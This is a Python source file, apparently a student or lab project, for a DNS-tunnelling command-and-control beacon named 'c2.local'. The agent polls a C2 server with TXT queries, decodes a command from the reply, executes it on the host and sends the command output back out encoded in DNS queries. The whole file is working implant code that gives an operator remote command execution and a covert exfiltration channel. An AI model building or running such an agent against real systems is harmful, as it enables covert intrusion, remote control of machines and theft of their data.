import socket
import dns.message as dm
from common.protocolo import DNSprotocolo
from agente.executor import commandExecutor
from time import sleep
import base64

class DNSBeacon:
    def __init__(self, ip_servidor='127.0.0.1', porta=53, dominio='c2.local'):
        self.ip = ip_servidor
        self.porta = porta
        self.dominio = dominio

    def start(self):
        print('[*] Iniciando agente')

        try:
            self.fazerBeacon()

        except Exception as e:
            print(f"[-] Erro no loop: {e}")

        sleep(2)

    def fazerBeacon(self):
        try:
            url_msg = DNSprotocolo.encodar(b'1', b'comando', self.dominio)
            print(f"[*] Enviando consulta para: {url_msg}")

            query = dm.make_query(url_msg, 'TXT')
            dados_binarios = query.to_wire()
        
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.sendto(dados_binarios, (self.ip, self.porta))
                print("[+] Sinal enviado com sucesso!")

                dadosResposta, ip = s.recvfrom(1024)
                respostaDNS = dm.from_wire(dadosResposta)

                if respostaDNS.answer:
                    self.executaResposta(respostaDNS, s, ip)

        except Exception as e:
            print(f"[-] Erro no Beacon: {e}")

    def executaResposta(self, pacote, sock, ip):
        try:
            objetoRRset = pacote.answer[0]
            comandoBytes = DNSprotocolo.traduzir(objetoRRset[0].strings[0])
            comando = comandoBytes.decode('utf-8')

            executor = commandExecutor()
            outputComando = executor.executaComando(comando)

            self.enviaResposta(sock, ip, outputComando)

        except Exception as e:
            print(f"[-] Erro no executaResposta: {e}")

    def enviaResposta(self, sock, ip, msg):
        try:
            urlResposta = DNSprotocolo.encodar(b'2', msg, self.dominio)

            queryResposta = dm.make_query(urlResposta, 'TXT')

            sock.sendto(queryResposta.to_wire(), ip)

        except Exception as e:
            print(f"[-] Erro no enviaResposta: {e}")

if __name__ == '__main__':
    agente = DNSBeacon()

    for i in range(2):
        agente.start()
        
